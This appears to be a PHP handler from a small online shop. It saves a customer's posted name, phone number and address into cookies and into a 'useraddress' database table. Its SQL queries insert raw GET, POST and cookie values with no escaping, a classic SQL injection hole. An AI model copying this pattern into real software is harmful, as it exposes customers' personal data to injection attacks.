<?php 
Define('PM_CALL',true);
Define('INC_CALL',true);
include dirname(__FILE__).('/../includes/global.class.php');
include dirname(__FILE__).('/../config/mysql.func.php');
include dirname(__FILE__).('/../config/Conn.php');
include dirname(__FILE__).('/../includes/getdata.php');

$ip=getIP();
if($_GET['gid']){

	setcookie('se_name',$_POST['name']);
	setcookie('se_ne',$_POST['ne']);
	setcookie('se_jiankong',$_POST['jiankong']);
	setcookie('se_tel',$_POST['tel']);
	setcookie('se_zipcode',$_POST['zipcode']);
	setcookie('se_region',$_POST['region']);
	setcookie('se_address',$_POST['address']);
	//判断操作用户是否填写地址，存在就更新此数据状态为3地址页和时间
	$_OID = _fetch_array("SELECT * FROM useraddress WHERE gid='{$_GET['gid']}'");
	
		if($_OID){
		  _query("
			  UPDATE 
				  useraddress
			  SET 
				  uadd='{$_POST['address']}',
				  utel='{$_POST['tel']}',
				  uname='{$_POST['name']}',
				  une='{$_POST['ne']}',
				  ujiankong='{$_POST['jiankong']}',
				  orderid='{$_COOKIE['orderid']}',
				  utime='{$_CURRENT_TIME2}'
			  WHERE 
				  gid='{$_OID['gid']}' LIMIT 1");
			_close();
			session_destroy();
		}
		header('Location:order.php');
	
	
}else{
	echo "商品信息获取错误，请检查GET传参是否正确";
}

?>